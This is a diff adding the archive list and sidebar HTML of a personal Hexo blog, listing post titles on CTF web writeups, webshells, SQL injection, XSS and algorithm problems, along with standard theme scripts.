+            <span class="archive-post-date">04/04</span><a class="archive-post-title" href="/2019/04/04/Leetcode-322-Coin-Change/">Leetcode 322.Coin Change[DP]</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/02</span><a class="archive-post-title" href="/2019/04/02/无字母数字-webshell/">无字母数字 webshell</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/02</span><a class="archive-post-title" href="/2019/04/02/2018-RCTF-Writeup/">2018-RCTF-Web-Writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/02</span><a class="archive-post-title" href="/2019/04/02/2019-TCTF-Writeup/">2019-TCTF-Writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/02</span><a class="archive-post-title" href="/2019/04/02/Hackme-Writeup/">Hackme-Web-Writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/01</span><a class="archive-post-title" href="/2019/03/01/SQLMAP-tamper列表/">sqlmap tamper 列表</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/26</span><a class="archive-post-title" href="/2019/02/26/Jarvis-OJ-inject/">Jarvis OJ inject</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/25</span><a class="archive-post-title" href="/2019/02/25/Jarvis-OJ-phpinfo/">Jarvis OJ phpinfo</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/02</span><a class="archive-post-title" href="/2019/02/02/Jarvis-OJ-Writeup/">Jarvis OJ Writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/01</span><a class="archive-post-title" href="/2019/02/01/Prompt-1-xss-通关记录/">xss-Prompt(1)-通关记录</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/30</span><a class="archive-post-title" href="/2019/01/30/2019-Fireshell-Web-Vice/">2019 fireshell web Vice</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/30</span><a class="archive-post-title" href="/2019/01/30/安恒杯-一月-web/">安恒杯 一月 web</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/02</span><a class="archive-post-title" href="/2019/01/02/Sqli-labs-通关记录/">Sqli-labs 通关笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/02</span><a class="archive-post-title" href="/2019/01/02/POJ-2352-Stars-树状数组/">POJ-2352-Stars[树状数组]</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/30</span><a class="archive-post-title" href="/2018/12/30/2017-NJCTF-Guess/">2017 NJCTF web guess</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/22</span><a class="archive-post-title" href="/2018/12/22/优雅实现哈夫曼编码/">优雅实现哈夫曼编码</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/08</span><a class="archive-post-title" href="/2018/12/08/Please_don't_stop_rua_233333/">Please don't stop rua 233333</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/30</span><a class="archive-post-title" href="/2018/11/30/Docker-常用命令/">Docker-常用命令清单</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/23</span><a class="archive-post-title" href="/2018/11/23/漏洞练习平台及工具/">漏洞练习平台及工具</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/28</span><a class="archive-post-title" href="/2018/10/28/ACM-常用Trick/">ACM 常用小 Trick</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/28</span><a class="archive-post-title" href="/2018/10/28/POJ-3984-迷宫问题-BFS/">POJ-3984-迷宫问题[BFS]</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/28</span><a class="archive-post-title" href="/2018/10/28/POJ-1321-棋盘问题-DFS/">POJ-1321-棋盘问题[DFS]</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/23</span><a class="archive-post-title" href="/2018/10/23/Raccoon-Writeup/">Raccoon web Writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/26</span><a class="archive-post-title" href="/2018/09/26/Bugku-Web-writeup/">Bugku Web 部分WP</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/26</span><a class="archive-post-title" href="/2018/01/26/葵花宝典/">葵花宝典</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/26</span><a class="archive-post-title" href="/2018/01/26/Web-安全笔记/">Web 安全笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/25</span><a class="archive-post-title" href="/2018/01/25/Hello_World/">Hello World</a>
+        </li>
+    
+    </ul></div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="Writeup"><span class="iconfont-archer">&#xe606;</span>Writeup</span>
+    
+        <span class="sidebar-tag-name" data-tags="php 伪随机数"><span class="iconfont-archer">&#xe606;</span>php 伪随机数</span>
+    
+        <span class="sidebar-tag-name" data-tags="算法"><span class="iconfont-archer">&#xe606;</span>算法</span>
+    
+        <span class="sidebar-tag-name" data-tags="ssrf"><span class="iconfont-archer">&#xe606;</span>ssrf</span>
+    
+        <span class="sidebar-tag-name" data-tags="Docker"><span class="iconfont-archer">&#xe606;</span>Docker</span>
+    
+        <span class="sidebar-tag-name" data-tags="反序列化"><span class="iconfont-archer">&#xe606;</span>反序列化</span>
+    
+        <span class="sidebar-tag-name" data-tags="SQLi"><span class="iconfont-archer">&#xe606;</span>SQLi</span>
+    
+        <span class="sidebar-tag-name" data-tags="webshell"><span class="iconfont-archer">&#xe606;</span>webshell</span>
+    
+        <span class="sidebar-tag-name" data-tags="xss"><span class="iconfont-archer">&#xe606;</span>xss</span>
+    
+        <span class="sidebar-tag-name" data-tags="渗透测试"><span class="iconfont-archer">&#xe606;</span>渗透测试</span>
+    
+        <span class="sidebar-tag-name" data-tags="笔记"><span class="iconfont-archer">&#xe606;</span>笔记</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br>
+    1、请确保node版本大于6.2<br>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "wywwzjj"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- algolia -->
+    
+    <!-- busuanzi  -->
+    
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+     
+    </body>
+</html>
+
+
